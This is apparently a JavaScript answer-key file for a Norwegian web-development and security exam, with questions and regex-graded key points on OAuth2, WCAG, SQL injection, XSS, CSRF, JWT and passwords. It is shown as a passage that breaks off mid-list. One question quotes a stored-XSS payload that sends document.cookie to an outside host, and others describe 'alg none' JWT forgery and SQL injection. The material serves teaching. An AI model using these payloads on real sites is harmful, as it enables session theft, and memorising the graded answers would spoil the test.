/* Skriftlige spørsmål. Svaret sjekkes mot nøkkelpunkter (det sensor ser etter).
   Hvert punkt har en liste med regex-alternativer (engelsk og norsk). Ikke-sensitivt for store/små bokstaver. */
window.DAT = window.DAT || {};
DAT.written = [
  {
    id: "w-csr-ssr", area: "wf", source: "h25 1a", theory: "csr-ssr",
    q: "Compare the performance of CSR and SSR using: 1) Initial page load time 2) Subsequent page load time 3) Throughput 4) Bandwidth.",
    points: [
      { label: "Initial load: SSR raskere (ferdig HTML) / CSR må laste og kjøre JS først", any: ["initial[\\s\\S]{0,200}(ssr|server)[\\s\\S]{0,80}(fast|quick|rask)", "(ssr|server)[\\s\\S]{0,120}(fast|rask)[\\s\\S]{0,120}initial", "csr[\\s\\S]{0,150}(download|execute|bundle|laste ned|kjør)[\\s\\S]{0,80}(javascript|js)"] },
      { label: "Subsequent load: CSR raskere (bare data/JSON, ingen full reload)", any: ["subsequent[\\s\\S]{0,200}(csr|client)[\\s\\S]{0,80}(fast|rask)", "(csr|client)[\\s\\S]{0,150}(only|bare|kun)[\\s\\S]{0,30}(data|json)", "no full (page )?reload|ingen full"] },
      { label: "Throughput: CSR høyere (serveren slipper rendering)", any: ["throughput[\\s\\S]{0,200}(csr|client)[\\s\\S]{0,60}(higher|høyere|better|bedre)", "throughput[\\s\\S]{0,200}(ssr|server)[\\s\\S]{0,80}(lower|lavere|cpu|render)"] },
      { label: "Bandwidth: SSR sender full HTML hver gang / CSR mindre per forespørsel men større første nedlasting", any: ["bandwidth[\\s\\S]{0,250}(full html|whole page|hele siden|more|mer|less|mindre)", "båndbredde"] },
      { label: "Begrunner med hvor rendering skjer (server vs nettleser)", any: ["render(s|ed|ing)? (on|in|at) the (server|browser|client)", "rendre[rs]? (på|i) (server|nettleser|klient)"] }
    ]
  },
  {
    id: "w-rmm", area: "wf", source: "v26 1a", theory: "rest-rmm",
    q: "Discuss briefly the different levels of the Richardson Maturity Model (RMM).",
    points: [
      { label: "Nivå 0: ett endepunkt / HTTP som transport (POX, RPC, SOAP)", any: ["level 0|nivå 0", "swamp|pox|single (endpoint|uri)|ett endepunkt|rpc|soap"] },
      { label: "Nivå 1: ressurser med egne URI-er", any: ["level 1[\\s\\S]{0,150}resource", "nivå 1[\\s\\S]{0,150}ressurs"] },
      { label: "Nivå 2: HTTP-verb (GET/POST/PUT/DELETE)", any: ["level 2[\\s\\S]{0,200}(verb|method|get|post)", "nivå 2[\\s\\S]{0,200}(verb|metode|get|post)"] },
      { label: "Nivå 2: riktige statuskoder", any: ["status code|statuskode|200|201|404"] },
      { label: "Nivå 3: HATEOAS / hypermedia-lenker", any: ["hateoas|hypermedia|links?\\b|lenke"] }
    ]
  },
  {
    id: "w-code-implicit", area: "wf", source: "h25 1d I, v26 1d I", theory: "oauth2",
    q: "What is the difference between the Authorization code flow and the Implicit grant flow?",
    points: [
      { label: "Code flow: AS returnerer først en authorization code", any: ["authori[sz]ation code[\\s\\S]{0,200}(return|get|receive|send|redirect)", "(returns?|receives?|gets?) (a|an|the) (short[- ]lived )?(authori[sz]ation )?code"] },
      { label: "Koden byttes mot token via back-channel / token-endepunkt", any: ["exchange|bytte|back[- ]?channel|token endpoint|/token|token-endepunkt"] },
      { label: "Klienten autentiserer seg (client secret / PKCE)", any: ["client[_ ]secret|pkce|code[_ ]verifier|client authentication|autentiserer (seg|klienten)"] },
      { label: "Implicit: access token returneres direkte i URL/redirect (fragment)", any: ["implicit[\\s\\S]{0,250}(directly|direkte)", "fragment|#access_token|in the (url|redirect)|i url"] },
      { label: "Implicit er mindre sikker: token eksponert i nettleser / ingen refresh token / utdatert", any: ["expos|leak|lekk|history|historikk|less secure|mindre sikker|deprecated|utdatert|no refresh|ingen refresh"] }
    ]
  },
  {
    id: "w-authcode-flow", area: "wf", source: "v24 1c I, h24 1c I", theory: "oauth2",
    q: "Briefly explain the authorization flow using the OAuth2 'authorization code grant type' between the resource owner, client and the IdP.",
    points: [
      { label: "Klienten redirecter brukeren til authorize-endepunktet (client_id, redirect_uri, scope)", any: ["redirect|authori[sz]e endpoint|/authorize|client_id|redirect_uri"] },
      { label: "Brukeren autentiserer seg og gir samtykke (consent)", any: ["log ?in|authenticat|consent|samtykke|logger inn"] },
      { label: "IdP sender authorization code tilbake til redirect URI", any: ["(authori[sz]ation )?code[\\s\\S]{0,120}(redirect|callback|back to)", "returns? (a|an|the) code"] },
      { label: "Klienten bytter koden mot access token (med client secret)", any: ["exchange|bytter|token endpoint|/token|client[_ ]secret"] },
      { label: "Klienten bruker access token mot resource server", any: ["resource server|bearer|access (the )?(protected )?resource|api"] }
    ]
  },
  {
    id: "w-password-grant", area: "wf", source: "h23 1c I", theory: "oauth2",
    q: "Briefly explain the authorization flow using the OAuth2 'resource owner password credentials grant'.",
    points: [
      { label: "Brukeren gir brukernavn/passord direkte til klienten", any: ["(username|user ?name|brukernavn)[\\s\\S]{0,60}(password|passord)[\\s\\S]{0,120}(client|klient)", "(gives|enters|provides|gir)[\\s\\S]{0,80}(credentials|passord|password)"] },
      { label: "Klienten sender dem til token-endepunktet (grant_type=password)", any: ["token endpoint|/token|grant_type\\s*=\\s*password|token-endepunkt"] },
      { label: "AS returnerer access token (+ refresh token)", any: ["access token|access_token|tilgangstoken"] },
      { label: "Kun for høyt betrodde klienter / frarådet fordi klienten ser passordet", any: ["trust|betrodd|first[- ]party|discourag|deprecated|frarådet|sees? the password|ser passordet"] }
    ]
  },
  {
    id: "w-mvc-layers", area: "wf", source: "Pensum: Spring MVC layers", theory: "mvc-spring",
    q: "Discuss the relationships between the layers in a Spring MVC application: presentation, business, persistence and database.",
    points: [
      { label: "Presentation = Controller (@Controller/@RestController) håndterer HTTP", any: ["presentation[\\s\\S]{0,150}controller", "@(rest)?controller"] },
      { label: "Business = Service (@Service) med forretningslogikk", any: ["business[\\s\\S]{0,150}service", "@service"] },
      { label: "Persistence = Repository (@Repository / JPA)", any: ["persistence[\\s\\S]{0,150}(repository|jpa|dao)", "@repository|crudrepository|jparepository"] },
      { label: "Hvert lag bruker bare laget under (controller → service → repository → DB)", any: ["controller[\\s\\S]{0,60}service[\\s\\S]{0,60}repository", "layer below|laget under|calls the|kaller"] },
      { label: "Kobles med dependency injection (@Autowired)", any: ["@autowired|dependency injection|di\\b"] }
    ]
  },
  {
    id: "w-cicd", area: "wf", source: "Pensum: CI/CD", theory: "cicd",
    q: "What is CI and what activities are involved? What is CD and what activities are involved? What is the difference between continuous delivery and continuous deployment?",
    points: [
      { label: "CI: hyppig integrasjon til felles branch med automatisk bygg/test ved hver commit", any: ["(frequent|often|ofte)[\\s\\S]{0,100}(merge|integrat|commit)", "every (commit|push)|hver (commit|push)"] },
      { label: "CI-steg: build, unit test, statisk analyse", any: ["build|bygg", "unit test|enhetstest", "static analysis|statisk analyse|lint|sonar|sast"] },
      { label: "CD-steg: artefakt, deploy til staging, akseptansetester", any: ["artifact|artefakt|docker|image", "staging|test environment|testmiljø", "acceptance|akseptanse|e2e|end-to-end"] },
      { label: "Delivery: klar til produksjon, manuell godkjenning", any: ["manual|manuell|approv|godkjenn"] },
      { label: "Deployment: automatisk helt til produksjon", any: ["automatic(ally)?[\\s\\S]{0,60}production|automatisk[\\s\\S]{0,60}produksjon"] }
    ]
  },
  {
    id: "w-g11n", area: "g11n", source: "Hvert år (Q2a)", theory: "gilt",
    q: "In your own words, briefly explain what globalization, internationalization and localization are.",
    points: [
      { label: "Globalization: gjøre appen tilgjengelig globalt", any: ["globali[sz]ation[\\s\\S]{0,200}(world|global|available|tilgjengelig|market)"] },
      { label: "Globalization inkluderer i18n + l10n", any: ["include|inkluder|consists|both|= ?i18n ?\\+|består"] },
      { label: "i18n: teknisk tilrettelegging for flere språk uten endring i design/kode", any: ["without (having to )?(chang|modif)|uten (å )?endr", "(design|code|kode)[\\s\\S]{0,40}(chang|endr)"] },
      { label: "i18n: eksternaliserer tekst (resource bundles / property files)", any: ["resource bundle|propert|externali|ekstern"] },
      { label: "l10n: tilpasning til en bestemt locale (språk + region)", any: ["locali[sz]ation[\\s\\S]{0,200}(specific|particular|bestemt|locale|region)"] },
      { label: "l10n: oversettelse + format på dato/tall/valuta", any: ["translat|oversett", "date|dato|number|tall|currency|valuta"] }
    ]
  },
  {
    id: "w-locale-resolver", area: "g11n", source: "Pensum: Spring i18n", theory: "spring-i18n",
    q: "What are the differences between a SessionLocaleResolver and a CookieLocaleResolver? List the steps to internationalize a Spring web application.",
    points: [
      { label: "Session: locale lagres i HTTP-session på serveren", any: ["session[\\s\\S]{0,100}(server|attribute|attributt)"] },
      { label: "Session: forsvinner når sesjonen utløper", any: ["(expire|end|ends|timeout|lost|forsvinn|utløp)"] },
      { label: "Cookie: locale lagres i cookie i nettleseren og huskes mellom besøk", any: ["cookie[\\s\\S]{0,120}(browser|client|nettleser|klient)", "persist|remember|husk|next visit|neste besøk"] },
      { label: "Steg: properties-filer per språk", any: ["messages(_\\w+)?\\.properties|property files|resource bundle"] },
      { label: "Steg: LocaleResolver-bean + LocaleChangeInterceptor (lang-param)", any: ["localechangeinterceptor|interceptor"] },
      { label: "Steg: bruk nøkler i view (Thymeleaf #{...})", any: ["#\\{|th:text|message key|nøkler i"] }
    ]
  },
  {
    id: "w-ud", area: "ud", source: "h24 4a-b, h25 3a-b", theory: "ud",
    q: "What is Universal Design? Give 3 principles of UD and explain them briefly.",
    points: [
      { label: "Definisjon: usable by all people, without adaptation/specialized design", any: ["all people|alle mennesker|everyone|alle", "adaptation|specialized|tilpasning|spesiell"] },
      { label: "Prinsipp: Equitable use", any: ["equitable|like muligheter"] },
      { label: "Prinsipp: Flexibility in use", any: ["flexib|fleksib"] },
      { label: "Prinsipp: Simple and intuitive", any: ["simple|intuitive|enkel|intuitiv"] },
      { label: "Prinsipp: Perceptible information / Tolerance for error / Low physical effort / Size and space", any: ["perceptible|tolerance|low physical|size and space|feil|anstrengelse|størrelse"] }
    ]
  },
  {
    id: "w-wcag", area: "ud", source: "h23 4a, v24 4a, v26 3a", theory: "ud",
    q: "What is the Web Content Accessibility Guidelines (WCAG)?",
    points: [
      { label: "Standard/retningslinjer fra W3C", any: ["w3c|wai|standard|guideline|retningslinje"] },
      { label: "Gjør webinnhold tilgjengelig for personer med funksjonsnedsettelser", any: ["disabilit|funksjonsnedsett|impair|accessible|tilgjengelig"] },
      { label: "Fire prinsipper POUR", any: ["perceivable[\\s\\S]*operable[\\s\\S]*understandable[\\s\\S]*robust", "pour"] },
      { label: "Retningslinjer med testbare suksesskriterier", any: ["success criteri|suksesskriteri|testable|testbar"] },
      { label: "Nivåene A, AA, AAA", any: ["\\bAAA\\b|\\bAA\\b|levels? a\\b"] }
    ]
  },
  {
    id: "w-perceivable", area: "ud", source: "v24 4b, v26 3b", theory: "ud",
    q: "Briefly discuss WCAG principle #1 'Perceivable' and the guidelines for this principle.",
    points: [
      { label: "Definisjon: info og UI må presenteres slik at brukere kan oppfatte dem", any: ["present|perceive|oppfatte|sanse"] },
      { label: "1.1 Text alternatives (alt-tekst)", any: ["text alternative|alt[- ]te(x|k)st|tekstalternativ"] },
      { label: "1.2 Time-based media (captions/teksting)", any: ["time[- ]based|caption|teksting|subtit|transcript|media"] },
      { label: "1.3 Adaptable (struktur, ulike presentasjoner)", any: ["adaptable|tilpasningsdyktig|structure|struktur|semantic|semantisk"] },
      { label: "1.4 Distinguishable (kontrast, se og høre)", any: ["distinguishable|kontrast|contrast|see and hear|se og høre"] }
    ]
  },
  {
    id: "w-operable", area: "ud", source: "h22, h23, h24, h25", theory: "ud",
    q: "Briefly discuss WCAG principle #2 'Operable' and the guidelines for this principle.",
    points: [
      { label: "Definisjon: UI og navigasjon må kunne betjenes", any: ["operab|betjen|operate"] },
      { label: "2.1 Keyboard accessible", any: ["keyboard|tastatur"] },
      { label: "2.2 Enough time", any: ["enough time|nok tid|time limit|tidsfrist"] },
      { label: "2.3 Seizures and physical reactions", any: ["seizure|anfall|flash|blink"] },
      { label: "2.4 Navigable", any: ["navigab|navigere|navigation"] },
      { label: "2.5 Input modalities", any: ["input modalit|pointer|gesture|gest|touch|inndata"] }
    ]
  },
  {
    id: "w-sast-dast", area: "sec", source: "h25 4a", theory: "ssdlc",
    q: "What is the difference between dynamic application security testing (DAST) and static application security testing (SAST)?",
    points: [
      { label: "SAST analyserer kildekode uten å kjøre den", any: ["(source|kilde)[- ]?(code|kode)[\\s\\S]{0,100}(without|uten)[\\s\\S]{0,30}(run|execut|kjør)", "without (running|executing)|uten å kjøre"] },
      { label: "DAST tester kjørende applikasjon (utenfra, HTTP)", any: ["running|kjørende|runtime|executing application"] },
      { label: "White-box vs black-box", any: ["white[- ]box|black[- ]box"] },
      { label: "Når: SAST tidlig (implementasjon), DAST senere (test)", any: ["early|tidlig|implementation phase|test(ing)? phase|testfase"] },
      { label: "Eksempelverktøy (SonarQube/SpotBugs vs ZAP/Burp)", any: ["sonar|spotbugs|findsecbugs|semgrep|zap|burp"] },
      { label: "Styrker/svakheter (false positives, eksakt linje, finner runtime/konfig-feil)", any: ["false positive|line|linje|configuration|konfigurasjon|runtime"] }
    ]
  },
  {
    id: "w-ssdlc", area: "sec", source: "h23 5a", theory: "ssdlc",
    q: "A software development lifecycle consists of requirement, design, implementation, testing and deployment phases. Mention one approach to identify security defects in each phase.",
    points: [
      { label: "Requirements: misuse/abuse cases / sikkerhetskrav", any: ["misuse|abuse|security requirement|sikkerhetskrav|risk"] },
      { label: "Design: threat modelling", any: ["threat model|trusselmodell|stride|architecture risk"] },
      { label: "Implementation: code review / SAST", any: ["code review|kodegjennomgang|static|sast"] },
      { label: "Testing: penetration testing / DAST / fuzzing", any: ["penetration|pentest|dast|fuzz"] },
      { label: "Deployment: konfigurasjonsreview / hardening / final security review", any: ["config|konfig|harden|final security review|scan"] }
    ]
  },
  {
    id: "w-sqli-why", area: "sec", source: "v26 4a I, v24 5d I", theory: "sqli",
    q: "Given: String sqlQuery = \"SELECT * FROM ACCDB WHERE USERNAME = \"+username+\" and PASSWORD = \"+password; PreparedStatement stmt = conn.prepareStatement(sqlQuery); — Explain why this query can be vulnerable to injection, and what the consequences of a successful attack can be.",
    points: [
      { label: "Untrusted input konkateneres inn i SQL-strengen", any: ["concatenat|konkatener|appended|added to the (query|string)|limt"] },
      { label: "…FØR prepareStatement – så PreparedStatement beskytter ikke", any: ["before[\\s\\S]{0,80}prepar|før[\\s\\S]{0,80}prepar|ineffective|no protection|ingen beskyttelse|beskytter ikke"] },
      { label: "Input tolkes som SQL-kode / endrer spørringens logikk", any: ["(interpreted|treated|tolkes) as (sql|code)|change[sd]? the (query|logic)|endre[rs]? (spørring|logikk)|' or '1'='1|--"] },
      { label: "Konsekvens: autentiseringsomgåelse", any: ["bypass|omgå|log ?in as|logge inn som"] },
      { label: "Konsekvens: lekkasje/endring/sletting av data", any: ["leak|read|steal|dump|modify|delete|drop|lese|stjele|endre|slette"] },
      { label: "Løsning: parameterbinding (? + setString)", any: ["\\?|placeholder|parameteri[sz]|setstring|bind"] }
    ]
  },
  {
    id: "w-sqli-types", area: "sec", source: "Pensum: Types of SQLi", theory: "sqli",
    q: "Describe the different types of SQL injection, and explain why ORDER BY needs special treatment when mitigating SQLi.",
    points: [
      { label: "In-band: error-based", any: ["error[- ]based|feilbasert"] },
      { label: "In-band: union-based", any: ["union"] },
      { label: "Blind: boolean-based og/eller time-based", any: ["blind|boolean|time[- ]based|sleep"] },
      { label: "Out-of-band eller second-order", any: ["out[- ]of[- ]band|second[- ]order|stored sqli"] },
      { label: "ORDER BY: kolonnenavn kan ikke parameteriseres (? = verdier, ikke identifikatorer)", any: ["(cannot|can't|kan ikke)[\\s\\S]{0,60}(parameteri|placeholder|\\?|bind)", "identifier|identifikator|column name|kolonnenavn"] },
      { label: "Løsning: allow-list / whitelist / mapping til faste kolonnenavn", any: ["whitelist|allow[- ]?list|hvitelist|mapping|fixed column|faste kolonne|switch"] }
    ]
  },
  {
    id: "w-cookie", area: "sec", source: "h24 5a, h25 4c", theory: "session",
    q: "What are the secure ways to protect session cookies stored in a web browser from XSS and session hijacking attacks?",
    points: [
      { label: "HttpOnly-flagg", any: ["httponly"] },
      { label: "…hindrer JavaScript (document.cookie) i å lese cookien", any: ["javascript|document\\.cookie|script"] },
      { label: "Secure-flagg", any: ["secure flag|secure ?=|\\bsecure\\b"] },
      { label: "…sendes kun over HTTPS (beskytter mot sniffing/MitM)", any: ["https|encrypted|kryptert|sniff|man[- ]in[- ]the[- ]middle"] },
      { label: "Ekstra: SameSite, regenerer session-ID, timeout, invalidate", any: ["samesite|regenerat|timeout|invalidat|expire"] }
    ]
  },
  {
    id: "w-xss-scenario", area: "sec", source: "v24 5c, v26 4d, h21", theory: "xss",
    q: "On https://gossip.blog.com a user's comment contains: <script>document.write(`<img src='' onerror='http://justpassingby.com/?'document.cookie/>`);</script>. Explain the types of vulnerability in this attack scenario.",
    points: [
      { label: "Stored (persistent) XSS", any: ["stored|persistent|lagret|vedvarende"] },
      { label: "Kjøres i nettleseren til alle som ser kommentaren", any: ["every|all users|alle|anyone|visitor|besøk"] },
      { label: "Mål: stjele session-cookie (document.cookie sendes til angriper)", any: ["steal|stjel|cookie theft|exfiltrat|send[s]? (the )?cookie"] },
      { label: "Følge: session hijacking / utgi seg for offeret", any: ["hijack|kapre|impersonat|utgi"] },
      { label: "onerror trigges av ugyldig src", any: ["onerror|invalid src|empty src|ugyldig"] },
      { label: "Tiltak: output encoding / input validation / HttpOnly / CSP", any: ["encod|escap|httponly|csp|content security policy|validat"] }
    ]
  },
  {
    id: "w-xss-vs-csrf", area: "sec", source: "h23 5c", theory: "xss",
    q: "Explain the difference between XSS and CSRF. Describe how output encoding mitigates XSS and how the synchronizer token pattern mitigates CSRF.",
    points: [
      { label: "XSS: injiserer og kjører script i offerets nettleser", any: ["inject|script[\\s\\S]{0,60}(run|execut|kjør)"] },
      { label: "CSRF: lurer offerets nettleser til å sende forfalsket forespørsel med offerets cookies", any: ["forge|forfalsk|trick|lure|on behalf|på vegne", "cookie[\\s\\S]{0,60}(automatic|automatisk)"] },
      { label: "Output encoding: spesialtegn konverteres (< → &lt;) så data vises som tekst, ikke kjøres", any: ["&lt;|html entit|special char|spesialtegn|as text|som tekst|not (executed|interpreted)"] },
      { label: "Kontekstuell encoding (HTML/attributt/JS/URL)", any: ["context|kontekst|attribute|attributt"] },
      { label: "Synchronizer token: tilfeldig token lagret i session og i skjema (hidden field)", any: ["random|tilfeldig|unpredictable|uforutsigbar", "hidden|skjult|session"] },
      { label: "Server sammenligner innsendt token med session-token; angriper kan ikke vite det", any: ["compar|sammenlign|match|validat|verif"] }
    ]
  },
  {
    id: "w-csrf-conditions", area: "sec", source: "h25 4e, v26 4f", theory: "csrf",
    q: "What assumptions or conditions are necessary for an attacker to exploit a Cross Site Request Forgery (CSRF) vulnerability in a web application?",
    points: [
      { label: "En relevant tilstandsendrende handling finnes", any: ["relevant action|state[- ]chang|tilstand|handling|transfer|change (e-?mail|password)"] },
      { label: "Cookie-basert sesjon – nettleseren sender credentials automatisk", any: ["cookie|session|automatic|automatisk"] },
      { label: "Ingen uforutsigbare parametere (ingen CSRF-token) – angriper kjenner alle parametere", any: ["predictable|forutsigbar|no (csrf )?token|ingen token|unpredictable|know (all )?(the )?param|kjenner"] },
      { label: "Offeret er innlogget og lures til angripers side/lenke", any: ["logged in|authenticated|innlogget|autentisert", "lure|trick|visit|click|lures|besøk|klikk"] },
      { label: "Ingen SameSite/Origin-sjekk", any: ["samesite|origin|referer"] }
    ]
  },
  {
    id: "w-jwt-sig", area: "sec", source: "v24 5e I, h23 5e I, v26 4b I", theory: "jwt",
    q: "A JWT consists of Header.Claims.Signature. Describe the two different ways to calculate the signature part.",
    points: [
      { label: "Symmetrisk: HMAC med delt hemmelig nøkkel", any: ["hmac|hs256|symmetric|symmetrisk"] },
      { label: "…over base64url(header) + base64url(claims)", any: ["base64[\\s\\S]{0,40}header[\\s\\S]{0,60}(claims|payload)"] },
      { label: "Asymmetrisk: signeres med privat nøkkel (RSA/ECDSA)", any: ["private key|privat nøkkel|rs256|rsa|asymmetric|asymmetrisk"] },
      { label: "Verifiseres med offentlig nøkkel / samme hemmelighet", any: ["public key|offentlig nøkkel|verif|same (secret|key)"] }
    ]
  },
  {
    id: "w-jwt-weak", area: "sec", source: "v26 4b II, v24 5e II, h23 5e II", theory: "jwt",
    q: "Assume the JWT token is signed with the secret key \"sentrum\". Discuss the major threat to this token.",
    points: [
      { label: "Svak/kort hemmelighet (ordbok-ord, lav entropi)", any: ["weak|svak|short|kort|dictionary|ordbok|entropy|entropi|guess"] },
      { label: "Kan knekkes offline med brute force/ordliste (hashcat, jwt_tool)", any: ["brute|wordlist|ordliste|crack|knekk|hashcat|john|jwt_tool|offline"] },
      { label: "Angriper kan forfalske gyldige tokens / endre claims (f.eks. role=ADMIN)", any: ["forge|forfalsk|sign (new|own|their)|modify claims|endre|admin|privilege|impersonat"] },
      { label: "Tiltak: lang tilfeldig hemmelighet (≥256 bit) eller RS256", any: ["random|tilfeldig|256|long|lang|rs256|asymmetric|rotate"] }
    ]
  },
  {
    id: "w-jwt-parse", area: "sec", source: "h23 5f, h24 5e, h25 4f", theory: "jwt",
    q: "Code uses Jwts.parser().setSigningKey(KEY).parse(accessToken) and then calls deleteAllUsers() if role == ADMIN. JWT #1: alg 'none', role ADMIN, signature removed (header.payload.). JWT #2: alg RS256, payload changed to role ADMIN, old signature. What is the result for each? What would change with parseClaimsJws()?",
    points: [
      { label: "parse() + JWT #1: aksepteres uten verifisering → deleteAllUsers() (privilege escalation)", any: ["#?1[\\s\\S]{0,200}(deleteallusers|line 7|linje 7|\\(2\\))", "deleteallusers[\\s\\S]{0,200}(none|unsigned|usignert)"] },
      { label: "JWT #2: signatur stemmer ikke med endret payload → InvalidTokenException", any: ["#?2[\\s\\S]{0,250}(invalidtoken|exception|line 12|linje 12|\\(1\\))", "signature[\\s\\S]{0,80}(mismatch|invalid|not match|ugyldig|stemmer ikke)"] },
      { label: "parse() aksepterer usignerte tokens (sjekker bare signatur hvis den finnes)", any: ["parse\\(\\)?[\\s\\S]{0,150}(unsigned|usignert|without signature|uten signatur|alg ?none)"] },
      { label: "parseClaimsJws() krever signert JWS → JWT #1 gir også exception", any: ["parseclaimsjws[\\s\\S]{0,200}(exception|reject|avvis|require|krever)"] }
    ]
  },
  {
    id: "w-trust", area: "sec", source: "h22 5f, h24 5f, v26 4e", theory: "jwt",
    q: "Describe briefly how the 'trust' relationship between an identity provider (IdP) and a service provider (SP) is established.",
    points: [
      { label: "SP må vite sikkert at token er utstedt av IdP og ikke endret", any: ["issued by|utstedt av|tamper|endret|manipul|authentic|integrity"] },
      { label: "Etableres med kryptografiske nøkler", any: ["key|nøkkel|crypto|krypto|certificate|sertifikat"] },
      { label: "IdP signerer med privat nøkkel", any: ["private key|privat nøkkel|signs?|signerer"] },
      { label: "SP verifiserer med IdP sin offentlige nøkkel/sertifikat (autentisitet + integritet)", any: ["public key|offentlig nøkkel|certificate|sertifikat|jwks"] },
      { label: "Symmetrisk: hemmelig nøkkel delt sikkert på forhånd", any: ["shared|delt|symmetric|symmetrisk|in advance|på forhånd|before"] }
    ]
  },
  {
    id: "w-rs-checks", area: "sec", source: "v24 5f, h21 5d", theory: "jwt",
    q: "A client sends a request with a JWT access token to a Resource Server. Describe the security actions the Resource Server must take before returning the protected resource.",
    points: [
      { label: "Verifisere signaturen (og forventet algoritme)", any: ["signature|signatur"] },
      { label: "Sjekke exp – ikke utløpt", any: ["exp|expir|utløp"] },
      { label: "Sjekke issuer (iss)", any: ["\\biss\\b|issuer|utsteder"] },
      { label: "Sjekke audience (aud)", any: ["\\baud\\b|audience|mottaker"] },
      { label: "Sjekke at nødvendige claims/roller/scope finnes", any: ["claim|role|rolle|scope|permission|tilgang"] }
    ]
  },
  {
    id: "w-as-actions", area: "sec", source: "h24 5g, h21 5d 1", theory: "jwt",
    q: "Describe the security actions the Authorization Server (IdP) must take before sending the JWT token to the client.",
    points: [
      { label: "iss – utsteder", any: ["\\biss\\b|issuer"] },
      { label: "aud – client_id som mottaker", any: ["\\baud\\b|audience|client_id"] },
      { label: "sub – unik bruker-id", any: ["\\bsub\\b|subject"] },
      { label: "exp og iat", any: ["\\bexp\\b|expir", "\\biat\\b|issued at"] },
      { label: "Tokenet MÅ signeres (50 % trekk uten!)", any: ["sign"] }
    ]
  },
  {
    id: "w-pw4", area: "sec", source: "v24 5a, h23 5g, h24 5d, h25 4b, v26 4c", theory: "passwords",
    q: "Passwords can be stored securely using 1) cryptographically secure hash, 2) slow hash algorithm, 3) unique per-user salt, 4) pepper. Explain the security benefits of these four features.",
    points: [
      { label: "Hash: enveis – passordet kan verifiseres, ikke gjenopprettes", any: ["one[- ]way|enveis|not recoverable|irreversib|cannot be reversed|ikke gjenopprett|verifiable|verifiserbar"] },
      { label: "Slow hash: work factor gjør hver gjetning treg → brute force/ordbok tar mye lengre tid", any: ["slow|treg|work factor|iteration|cost|bcrypt|pbkdf2|argon|scrypt"] },
      { label: "…øker tiden det tar å knekke", any: ["(increas|øke)[\\s\\S]{0,60}(time|tid)|longer|lengre|slows? down|bremser"] },
      { label: "Salt: like passord får ulike hasher", any: ["(same|identical|like) password[\\s\\S]{0,80}(different|ulike|forskjellig)", "(different|ulike|forskjellig) hash"] },
      { label: "Salt: gjør rainbow tables ubrukelige / angrip hver hash for seg", any: ["rainbow"] },
      { label: "Pepper: hemmelighet som IKKE lagres i databasen", any: ["not (stored )?in the database|ikke (lagret )?i databasen|outside the (db|database)|separate|config|hsm"] },
      { label: "Pepper: hindrer offline ordbok/rainbow-angrep hvis bare DB lekker", any: ["offline|database (is )?(stolen|leak)|db lekk|dictionary|ordbok"] }
    ]
  },
  {
    id: "w-pw-attacks", area: "sec", source: "h22 5d, pensum", theory: "passwords",
    q: "Describe the different ways to store passwords, which is best and why, the attacks against passwords, and how to enforce strong passwords during registration.",
    points: [
      { label: "Lagring: klartekst, kryptert, hash, hash+salt, slow hash+salt", any: ["plain ?text|klartekst", "encrypt|krypter", "salt"] },
      { label: "Best: slow hash + salt (+ pepper)", any: ["best[\\s\\S]{0,100}(slow|bcrypt|pbkdf2|argon|scrypt)|(slow|bcrypt|pbkdf2|argon)[\\s\\S]{0,100}best"] },
      { label: "Angrep: brute force", any: ["brute"] },
      { label: "Angrep: dictionary", any: ["dictionary|ordbok"] },
      { label: "Angrep: rainbow table / credential stuffing / spraying", any: ["rainbow|stuffing|spray"] },
      { label: "Policy: minimumslengde + kompleksitet/blocklist, validert på server", any: ["length|lengde|minimum", "complex|komplek|upper|lower|digit|special|blocklist|blacklist|common password|vanlige passord|pwned"] }
    ]
  },
  {
    id: "w-session-vulns", area: "sec", source: "h23 5d, h24 5b", theory: "session",
    q: "Explain session fixation and the logout vulnerability where only request.getSession().removeAttribute(\"user\") is called. What are the consequences and mitigations?",
    points: [
      { label: "Fixation: session-ID fornyes ikke ved innlogging", any: ["not (regenerat|renew|chang)|ikke (forny|regenerer|endre)|same session id|samme session"] },
      { label: "…angriper planter kjent ID og overtar sesjonen etter offerets innlogging", any: ["plant|known|kjent|attacker[\\s\\S]{0,80}(set|fix|provide)|account takeover|kontoovertakelse|hijack"] },
      { label: "Fiks: ny sesjon / changeSessionId() etter innlogging", any: ["changesessionid|new session|ny sesjon|invalidate[\\s\\S]{0,80}getsession"] },
      { label: "Logout: sesjonen lever videre, andre attributter fortsatt gyldige", any: ["still (valid|alive|active)|fortsatt (gyldig|aktiv)|other attributes|andre attributter|not invalidat|ikke invalider"] },
      { label: "Fiks: session.invalidate() (+ slett cookie)", any: ["invalidate"] }
    ]
  },
  {
    id: "w-blocking", area: "js", source: "h23 6a ii, v26 5c", theory: "async",
    q: "The browser is running asynchronously a piece of JavaScript code that is blocking. How does this affect the browser and the application? Explain.",
    points: [
      { label: "Én hovedtråd for JS, hendelser og rendering", any: ["single|one|én|ene|main thread|hovedtråd"] },
      { label: "Asynkron kode kjører også på hovedtråden (ikke parallelt)", any: ["same thread|samme tråd|not (in )?parallel|ikke parallel|main thread|hovedtråd"] },
      { label: "Event loop kan ikke behandle andre hendelser (klikk, timere, nettverk)", any: ["event loop|events?|hendelse|click|klikk|queue|kø"] },
      { label: "Siden/fanen fryser – ingen respons, ingen re-rendering", any: ["freez|fryse|frys|unresponsive|hang|not respond|svarer ikke"] },
      { label: "Løsning: Web Worker", any: ["worker"] }
    ]
  },
  {
    id: "w-async-examples", area: "js", source: "h23 6a i", theory: "async",
    q: "Give examples of situations where JavaScript code will be run asynchronously, and explain the asynchronous behaviour. (Do not equate asynchronous with threads!)",
    points: [
      { label: "Event listener (addEventListener) – kjører når hendelsen skjer", any: ["addeventlistener|event listener|click|klikk"] },
      { label: "Timer (setTimeout/setInterval)", any: ["settimeout|setinterval|timer"] },
      { label: "Nettverk: fetch/Ajax – callback når responsen kommer", any: ["fetch|ajax|xmlhttprequest|network|nettverk"] },
      { label: "Kode registreres nå og kjøres senere via event loop/kø", any: ["later|senere|event loop|queue|kø|callback"] },
      { label: "Nevner at det fortsatt er én tråd (ikke flertrådet)", any: ["single thread|one thread|én tråd|ikke (flere )?tråd|not (a )?(separate )?thread|main thread|hovedtråd"] }
    ]
  },
  {
    id: "w-dom-threads", area: "js", source: "h21 6a iii, v26 5d", theory: "workers",
    q: "What is the maximum number of concurrent threads that can access the DOM? Explain why.",
    points: [
      { label: "Svaret er én (1)", any: ["\\bone\\b|\\b1\\b|\\bén\\b|\\ben\\b"] },
      { label: "Bare hovedtråden har DOM-tilgang", any: ["main thread|hovedtråd"] },
